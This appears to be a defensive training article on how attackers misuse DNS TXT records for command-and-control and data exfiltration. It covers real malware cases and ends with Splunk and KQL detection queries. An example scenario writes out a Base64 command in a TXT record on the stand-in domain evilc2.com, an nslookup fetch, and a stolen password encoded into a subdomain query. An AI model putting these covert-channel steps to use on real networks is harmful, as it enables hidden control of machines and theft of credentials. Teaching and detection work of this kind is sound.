
ðŸ•µï¸ DNS TXT Record Abuse in Cyber Attacks

DNS (Domain Name System) TXT records were originally designed to hold arbitrary text data â€” like SPF, DKIM, and DMARC information for email authentication.
Attackers abuse this flexibility to hide commands and exfiltrate stolen data using DNS traffic, which is usually trusted and rarely blocked.

â¸»

ðŸ”¹ 1. What Are DNS TXT Records?
	â€¢	Legitimate use cases:
	â€¢	Email authentication (SPF, DKIM).
	â€¢	Domain ownership verification.
	â€¢	Arbitrary metadata about a domain.
	â€¢	Example (legit SPF TXT record):

example.com.   IN   TXT   "v=spf1 include:_spf.google.com ~all"



â¸»

ðŸ”¹ 2. How Attackers Abuse TXT Records

Attackers use TXT records as a hidden communication channel:
	â€¢	Inbound (C2): Attacker encodes commands inside TXT records. Malware queries these records â†’ decodes them â†’ executes commands.
	â€¢	Outbound (Exfiltration): Malware encodes stolen data inside DNS queries (subdomains) and sends them to attacker-controlled DNS servers.

â¸»

ðŸ”¹ 3. Example Attack Scenario

Step 1 â€“ Attacker Prepares

Registers domain evilc2.com and sets TXT records:

update1.evilc2.com. IN TXT "cGluZyAxOTIuMTY4LjAuMQ=="

(Base64 â†’ ping 192.168.0.1)

Step 2 â€“ Victim Infection

Malware is installed via phishing or exploit. It schedules queries like:

nslookup -type=TXT update1.evilc2.com

Step 3 â€“ Attacker Response

DNS server returns TXT payload â†’ malware decodes and runs command.

Step 4 â€“ Data Exfiltration

Malware encodes stolen password MyPass123 into Base64:

TXlQYXNzMTIz

Sends query:

TXlQYXNzMTIz.exfil.evilc2.com

Attacker extracts data from DNS logs.

â¸»

ðŸ”¹ 4. Real-World Malware Examples
	â€¢	DNSpionage (APT campaigns in Middle East)
	â€¢	Used scheduled TXT lookups to fetch attacker commands in Base64.
	â€¢	Commands included PowerShell payloads delivered silently.
	â€¢	FrameworkPOS (POS malware)
	â€¢	Stole credit card data and exfiltrated via TXT lookups.
	â€¢	Chosen because POS networks often allow only DNS traffic.
	â€¢	OilRig / APT34 (Helminth malware)
	â€¢	TXT records carried C2 instructions and scripts.
	â€¢	Exploited DNS trust to bypass firewalls.

â¸»

ðŸ”¹ 5. Why TXT Abuse Works
	â€¢	DNS traffic is almost never blocked in corporate networks.
	â€¢	TXT records can hold long arbitrary strings.
	â€¢	Queries look like normal DNS activity.
	â€¢	Firewalls and proxies rarely inspect TXT contents.

â¸»

ðŸ”¹ 6. Detection Strategies (SOC/SIEM)

Indicators of Suspicion
	â€¢	Unusually high number of TXT lookups.
	â€¢	TXT records containing Base64, hex, or long random strings.
	â€¢	Internal hosts repeatedly querying the same external domain.
	â€¢	Randomized subdomains in queries (used for exfiltration).

Example Splunk Query

index=dns sourcetype="dns_logs"
| where query_type="TXT"
| stats count by src_ip, domain, txt_record
| where count > 50 OR match(txt_record,"^[A-Za-z0-9+/=]{20,}$")

Example Sentinel (KQL) Query

DnsEvents
| where QueryType == "TXT"
| summarize Count=count() by ClientIP, Name, ResponseName
| where Count > 50 or ResponseName matches regex "^[A-Za-z0-9+/=]{20,}$"


â¸»

ðŸ”¹ 7. SOC Analyst Takeaways
	â€¢	Normal use: TXT is rare except for email/authentication lookups.
	â€¢	Malware use: TXT queries are scheduled, periodic, and carry encoded payloads.
	â€¢	Key hunting tip: Baseline your environmentâ€™s normal TXT traffic â†’ alert on outliers.

â¸»

ðŸ”¹ 8. Visual Flow

[Victim PC: Malware] â†’ DNS TXT query â†’ [Attacker-controlled DNS]
         â†‘                                       â†“
   Encoded stolen data          Encoded commands (Base64/Hex)


â¸»

âœ… Summary
	â€¢	DNS TXT abuse is a stealthy way to run C2 and exfiltration over a protocol thatâ€™s almost always allowed.
	â€¢	Real malware like DNSpionage, FrameworkPOS, and OilRig (APT34) have used this.
	â€¢	SOC teams should monitor DNS TXT traffic, look for encoded data, and alert on high-frequency or suspicious queries.

â¸»
